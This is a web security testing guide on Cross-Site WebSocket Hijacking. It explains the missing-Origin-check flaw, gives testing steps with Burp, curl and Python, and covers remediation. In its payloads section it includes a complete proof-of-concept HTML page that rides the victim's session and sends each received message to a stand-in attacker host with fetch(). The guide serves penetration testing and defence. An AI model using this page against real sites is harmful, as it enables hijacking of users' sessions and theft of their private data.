# WebSocket Origin Not Validated

## Overview
WebSocket connections are initiated via an HTTP upgrade request that includes an `Origin` header indicating the page from which the connection was initiated. Unlike standard browser CORS enforcement, the WebSocket protocol does not mandate that servers validate this `Origin` header — server-side enforcement is entirely the developer's responsibility. When a server accepts WebSocket connections from any origin, malicious web pages on other domains can establish WebSocket connections to the server using the victim's credentials (cookies, session tokens), leading to Cross-Site WebSocket Hijacking (CSWSH) and unauthorized data access.

## How It Works
During the WebSocket handshake:
```http
GET /chat HTTP/1.1
Host: target.com
Origin: https://attacker.com    <-- browser sets this automatically
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
```

The server should validate that `Origin` matches an expected value. If it does not, the server responds with a 101 Switching Protocols, establishing the connection. An attacker's page at `https://attacker.com` can then open this WebSocket connection using the victim's session cookies, and interact with the WebSocket API as if they were the legitimate user.

## Impact
- Unauthorized access to real-time data streams (chat messages, financial data, private feeds)
- Performing actions on behalf of authenticated users (sending messages, making trades, executing commands)
- Account takeover via WebSocket-based authentication flows
- Data exfiltration of all messages the victim would receive
- Lateral movement if the WebSocket provides access to internal APIs
- Cross-Site WebSocket Hijacking (CSWSH) — the full attack chain

## Where to Look
- Any endpoint that performs a WebSocket upgrade (`Upgrade: websocket` in responses)
- Chat applications, real-time dashboards, gaming platforms, trading platforms
- Collaboration tools that push data to connected clients
- Admin panels with live log or monitoring feeds
- APIs that provide server-sent events via WebSocket

## Testing Steps
1. Identify all WebSocket endpoints by browsing the application and watching for WebSocket connections in Browser DevTools (Network tab, filter "WS").
2. Capture the WebSocket handshake in Burp Suite's **WebSockets** tab.
3. Inspect the `Origin` header sent in the handshake request.
4. In Burp **Repeater**, resend the handshake with a different `Origin` value:
   ```http
   Origin: https://attacker.com
   ```
5. If the server responds with `101 Switching Protocols` — origin validation is absent.
6. Test with various origins: `null`, `file://`, `https://evil.target.com`, `http://target.com.evil.com`.
7. Build a PoC HTML page (from `https://attacker.com`) that opens a WebSocket to the target and exfiltrates received messages.
8. Verify the connection uses the victim's session cookies by checking what data is returned.
9. Test from different browsers and check if the behavior differs.
10. Review server-side code (if available) for `websocket.on('connection', ...)` handlers that do not check the origin.

## Payloads / Techniques

Checking origin validation with curl (simulating WebSocket handshake):
```bash
curl -v \
  -H "Host: target.com" \
  -H "Origin: https://attacker.com" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  https://target.com/ws
# HTTP 101 response = origin not validated
# HTTP 403 response = origin validated
```

Python script to test origin validation:
```python
import websocket

def test_origin(ws_url, origin):
    headers = {
        'Origin': origin,
        'Cookie': 'session=VICTIM_SESSION_COOKIE'
    }
    try:
        ws = websocket.create_connection(ws_url, header=headers)
        print(f"[VULNERABLE] Connected with Origin: {origin}")
        msg = ws.recv()
        print(f"Received: {msg}")
        ws.close()
    except Exception as e:
        print(f"[BLOCKED] Origin {origin}: {e}")

test_origin('wss://target.com/ws', 'https://attacker.com')
test_origin('wss://target.com/ws', 'null')
test_origin('wss://target.com/ws', 'http://localhost')
```

PoC HTML page for CSWSH (full exploit):
```html
<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<h1>Loading...</h1>
<script>
var exfil = [];
var ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
  console.log('[*] Connected to target WebSocket');
  // Send a message as the victim
  ws.send(JSON.stringify({type: 'getProfile'}));
};

ws.onmessage = function(event) {
  console.log('[*] Received:', event.data);
  exfil.push(event.data);
  // Exfiltrate to attacker server
  fetch('https://attacker.com/exfil', {
    method: 'POST',
    body: JSON.stringify({data: event.data, timestamp: Date.now()}),
    headers: {'Content-Type': 'application/json'}
  });
};

ws.onerror = function(e) {
  console.log('[!] Error:', e);
};

ws.onclose = function() {
  console.log('[*] Connection closed. Collected:', exfil.length, 'messages');
};
</script>
</body>
</html>
```

## Burp Suite Tips
- Burp automatically captures WebSocket handshakes in the **WebSockets history** tab under **Proxy**.
- Send the handshake request to **Repeater** and modify the `Origin` header — Burp will show the upgrade response.
- Use **Burp's WebSocket message viewer** to see both sent and received frames in the connection.
- The **CSWSH Scanner** in Burp Pro's active scan will flag missing origin validation.
- Use **Match and Replace** to automatically change the `Origin` header in all WebSocket handshakes during testing.

## Tools
- Burp Suite — WebSocket interception and replaying
- wscat — command-line WebSocket client: `wscat -c wss://target.com/ws -H "Origin: https://attacker.com"`
- websocat — feature-rich WebSocket client for scripting
- Python websocket-client library — `pip install websocket-client`
- OWASP ZAP — WebSocket fuzzer and origin testing

## Remediation
- Validate the `Origin` header against an allowlist of trusted origins on every WebSocket handshake:
  ```python
  # Python/Django Channels example
  async def websocket_connect(self, event):
      origin = self.scope['headers'].get('origin', b'').decode()
      if origin not in ['https://app.example.com', 'https://www.example.com']:
          await self.close(code=4001)
          return
  ```
- Do not rely solely on cookies for WebSocket authentication — implement token-based auth in the WebSocket handshake or first message.
- Implement CSRF tokens for WebSocket connections where possible.
- Use `Content-Security-Policy: connect-src 'self'` to restrict which origins can open WebSocket connections from your pages.
- Log and monitor unexpected origins in WebSocket connection attempts.

## References
https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
https://owasp.org/www-community/attacks/Cross-Site_WebSocket_Hijacking
https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API/Writing_WebSocket_servers
https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#websockets
